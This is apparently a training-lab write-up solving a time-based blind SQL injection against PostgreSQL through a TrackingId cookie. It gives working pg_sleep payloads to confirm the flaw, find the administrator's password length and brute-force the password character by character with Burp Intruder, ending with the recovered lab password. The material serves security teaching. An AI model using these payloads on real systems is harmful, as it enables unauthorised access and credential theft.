## Lab Description :

![image]()

## Solution :

The captured request is as follows ,

![image]()


The query looks somethiung like this :

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>''
```

#### Confirm that blind sql injection works -

Modify the cookie value

Since it is a POSTgreSQL , we use the following syntax

![image]()


```sql
TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```
We get response after 10 sec delay, which confirms the blind SQL injection vulnerability

![image]()

Change the boolean condition (1=2) to verify it

```sql
TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
```

We get a response immediately which means the condition failed (1=2)

![image]()

#### Verify administrator user exists -


```sql
TrackingId=x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```
It takes 10 sec to respond which means there is indeed a user called administrator

![image]()

#### Find the length of admin's password -

To determine how many characters are in the password of the administrator user. To do this, change the value to: 

The below payload checks if the length is > 1.

```sql
';SELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
```

![image]()


It takes 10 sec delay to respond which means it is > 1 character.

Automate this process,

1. Send the req to intruder
2. Add length of password part as payload *(>1)*
3. Payload type - Sniper
4. Payload - Numbers (1 to 50 with step 1)

Add an extra column called `Response Received` to show the response time of each request.


At a payload 20 , the delay of response does not happen, means the length of password is **20 characters**

![image]()

#### Bruteforce the admin's password -

To bruteforce the password, we use a payload where we take first letter of the password and try to match it with all alphabets and numbers. If it matches then we get a 10 sec delay. 

```sql
TrackingId=x'%3BSELECT+CASE+WHEN (username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```

Automate this 

1. Add the part which replaces the first character ($1$,1) as payload 1.
2. Add the character to be matched against ('a') as payload 2.
3. Attack type - Cluster Bomb 
4. Payload 1 - Numbers (1 to20 with step 1)
5. Payload 2 - Bruteforcer (min & max length as 1)

Once we get the result, we can segregate the result and get the password like before, since we can't arrange both *response received* and *payload1* together. 

So,

Highlight the requests which has 10 sec delay.

![image]()


Select **Show only highlighted items** filter

![image]()

Now we get only the 20 items.NOw we can segregate in order based on PAYLOAD 1.

![image]()



We get the password of admin as - `30mmlu0fageqdcj4qv04`


![image]()







